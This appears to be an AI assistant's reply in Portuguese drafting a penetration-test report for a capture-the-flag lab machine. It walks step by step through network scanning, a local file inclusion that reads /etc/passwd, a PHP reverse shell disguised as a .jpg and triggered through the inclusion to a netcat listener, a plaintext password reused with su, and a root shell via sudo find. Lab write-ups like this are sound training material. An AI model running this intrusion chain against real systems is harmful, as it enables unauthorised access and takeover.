@@ -1,0 +1,158 @@
+Com certeza. O que você montou é um *walkthrough* clássico de um desafio de Capture The Flag (CTF) ou de um laboratório de pentest.
+
+Aqui está um esboço de como você pode documentar cada etapa, explicando o **"porquê"** de cada comando. Você pode usar esta estrutura como base para o seu relatório final.
+
+-----
+
+## Relatório de Teste de Invasão (Rascunho)
+
+**Objetivo:** Identificar e explorar vulnerabilidades em um host-alvo na rede `192.168.56.0/24` para obter acesso administrativo (root) e capturar as flags.
+
+-----
+
+### Fase 1: Reconhecimento e Enumeração
+
+Nesta fase, o objetivo é identificar o IP da máquina atacante, descobrir o alvo na rede e mapear seus serviços.
+
+1.  **Identificação do IP Local**
+
+      * **Comando:** `ip -br -c a`
+      * **Propósito:** Verificar o endereço IP da própria máquina atacante (ex: `192.168.56.103` na interface `eth0`). Este IP é crucial para ser usado posteriormente na configuração do *shell reverso*.
+
+2.  **Descoberta de Hosts na Rede**
+
+      * **Comando:** `netdiscover -i eth0 -P -r 192.168.56.0/24`
+      * **Propósito:** Realizar uma varredura (scan) ativa na sub-rede para encontrar outros hosts ativos. O alvo (`192.168.56.101`) foi identificado através deste comando.
+
+3.  **Verificação Inicial do Alvo**
+
+      * **Ação:** Acessar o site `http://192.168.56.101`
+      * **Propósito:** Confirmar que o host-alvo está executando um servidor web na porta 80 (HTTP).
+
+4.  **Varredura de Portas e Serviços**
+
+      * **Comando:** `nmap -sV -p- 192.168.56.101`
+      * **Propósito:** Executar uma varredura Nmap detalhada no alvo.
+          * `-sV`: Tenta identificar a versão dos serviços em execução.
+          * `-p-`: Realiza a varredura em todas as 65.535 portas TCP (e não apenas nas mais comuns).
+      * **Resultado Esperado:** Um mapa de todos os serviços expostos pelo alvo (ex: SSH, FTP, mais portas web).
+
+5.  **Enumeração de Diretórios Web**
+
+      * **Comando:** `gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirb/big.txt`
+      * **Propósito:** Usar o Gobuster para forçar a descoberta de diretórios e arquivos ocultos no servidor web. Isso é feito testando nomes comuns de uma lista de palavras (`big.txt`). O objetivo é encontrar páginas de login, painéis administrativos ou, neste caso, um diretório de `uploads`.
+
+-----
+
+### Fase 2: Exploração da Vulnerabilidade
+
+Nesta fase, uma vulnerabilidade de **Local File Inclusion (LFI)** é identificada e usada para ler arquivos do sistema e, posteriormente, executar um shell.
+
+6.  **Identificação do Vetor de Ataque**
+
+      * **Ação:** Clicar na funcionalidade "language" do site.
+      * **Propósito:** Observar que a URL muda para algo como `.../language.php?lang=en.php`, indicando que a página carrega arquivos com base no parâmetro `lang`.
+
+7.  **Teste de LFI (Inclusão de Arquivo Local)**
+
+      * **Ação:** Alterar a URL para: `http://192.168.56.101/language.php?lang=../../../etc/passwd`
+      * **Propósito:** Tentar explorar a vulnerabilidade de LFI. A sequência `../` é usada para "subir" diretórios e tentar ler o arquivo `/etc/passwd`, que contém a lista de usuários do sistema Linux.
+
+8.  **Confirmação da Vulnerabilidade**
+
+      * **Ação:** Usar a função "Exibir código-fonte" (View Page Source) do navegador.
+      * **Propósito:** Confirmar que o conteúdo do arquivo `/etc/passwd` foi carregado no HTML da página, validando o sucesso da exploração do LFI.
+
+-----
+
+### Fase 3: Obtenção de Acesso Inicial (Shell Reverso)
+
+O objetivo aqui é usar a vulnerabilidade de LFI combinada com um diretório de upload (encontrado pelo Gobuster) para executar um *shell reverso* e obter controle da máquina.
+
+9.  **Preparação do Payload (Shell Reverso)**
+
+      * **Comandos:**
+        ```bash
+        cd /usr/share/webshells/php
+        cp php-reverse-shell.php revshell.php.jpg
+        nano revshell.php.jpg
+        ```
+      * **Propósito:**
+        1.  Navegar até o diretório de shells padrão do Kali.
+        2.  Copiar o shell PHP e **disfarçá-lo com a extensão `.jpg`**. Isso é feito para burlar filtros de upload que só permitem arquivos de imagem.
+        3.  Editar o arquivo (`nano`) para inserir o IP da máquina atacante (`192.168.56.103`) e uma porta (ex: `1234`).
+
+10. **Upload do Payload**
+
+      * **Ação:** Fazer o upload do arquivo `revshell.php.jpg` através da funcionalidade de upload encontrada (provavelmente no diretório `/uploads` descoberto pelo Gobuster).
+
+11. **Preparação do "Ouvinte" (Listener)**
+
+      * **Comando:** `nc -nlvp 1234`
+      * **Propósito:** Iniciar um "ouvinte" (listener) do Netcat na máquina atacante, na porta `1234`. Este comando aguardará a conexão vinda do shell reverso.
+
+12. **Execução do Payload (Trigger)**
+
+      * **Ação:** Acessar a URL: `http://192.168.56.101/language.php?lang=/uploads/revshell.php.jpg`
+      * **Propósito:** Usar a vulnerabilidade de LFI para forçar o servidor a *incluir* e *executar* o arquivo de shell que foi enviado. O servidor, ao processar o PHP dentro do falso `.jpg`, iniciará uma conexão de volta para o *listener* Netcat.
+      * **Resultado:** Acesso inicial ao sistema como o usuário do servidor web (ex: `www-data`).
+
+-----
+
+### Fase 4: Pós-Exploração e Escalação de Privilégio
+
+Após ganhar o acesso inicial, o objetivo é estabilizar o shell, encontrar credenciais para "pivotar" para outro usuário e, finalmente, escalar privilégios para `root`.
+
+13. **Estabilização do Shell**
+
+      * **Comando:** `python3 -c "import pty;pty.spawn('/bin/bash')"`
+      * **Propósito:** O shell reverso do Netcat é "burro" (não-interativo). Este comando usa Python para criar um shell `bash` totalmente interativo (TTY), permitindo o uso de `Tab` (autocompletar) e `Ctrl+C` sem matar a conexão.
+
+14. **Enumeração Interna (Em busca da Flag 1)**
+
+      * **Comandos:**
+        ```bash
+        cd /var/www/html/supersecret-for-aziz
+        cat bassam-pass.txt
+        ```
+      * **Propósito:** Explorar os diretórios do servidor web em busca de arquivos de configuração, notas ou credenciais deixadas para trás. Um arquivo de senha (`bassam-pass.txt`) é encontrado.
+
+15. **Escalação de Privilégio Horizontal (User)**
+
+      * **Comandos:**
+        ```bash
+        su bassam
+        ls -la /home/bassam
+        cat user.txt
+        ```
+      * **Propósito:** Usar o comando `su` (Switch User) e a senha encontrada (`Password123!@#`) para se tornar o usuário `bassam`. Após a troca, a primeira flag (`user.txt`) é lida.
+
+16. **Enumeração para Escalação de Privilégio (Root)**
+
+      * **Comando:** `sudo -l`
+      * **Propósito:** Verificar quais comandos o usuário `bassam` pode executar como `root` (superusuário) usando `sudo`, e se ele precisa de senha.
+
+17. **Identificação do Vetor de Escalação (GTFOBins)**
+
+      * **Ação:** Acessar o site [GTFOBins](https://gtfobins.github.io/).
+      * **Propósito:** O `sudo -l` provavelmente revelou que `bassam` pode rodar o comando `find` como `root`. GTFOBins é uma referência de como binários legítimos do Linux podem ser "abusados" para escalar privilégios.
+
+18. **Escalação para Root**
+
+      * **Comando:** `sudo find . -exec /bin/sh \; -quit`
+      * **Propósito:** Este é o payload do GTFOBins para o `find`. Ele usa o `find` (rodando como `root` via `sudo`) para executar (`-exec`) um shell (`/bin/sh`). Como o `find` é `root`, o shell que ele invoca também é `root`.
+      * **Comando (alternativo):** `id` (para confirmar que agora é `uid=0(root)`).
+
+19. **Captura da Flag Final**
+
+      * **Comandos:**
+        ```bash
+        cd /root
+        ls
+        cat flag.txt
+        ```
+      * **Propósito:** Navegar até o diretório `/root` (acessível apenas pelo superusuário) e ler a flag final, completando o desafio.
+
+-----
+
+Amanhã, quando tiver as informações exatas da prova (como as saídas dos comandos Nmap e Gobuster, ou o conteúdo exato do `sudo -l`), me passe aqui e eu ajusto esta documentação para o seu relatório final. Boa sorte\!
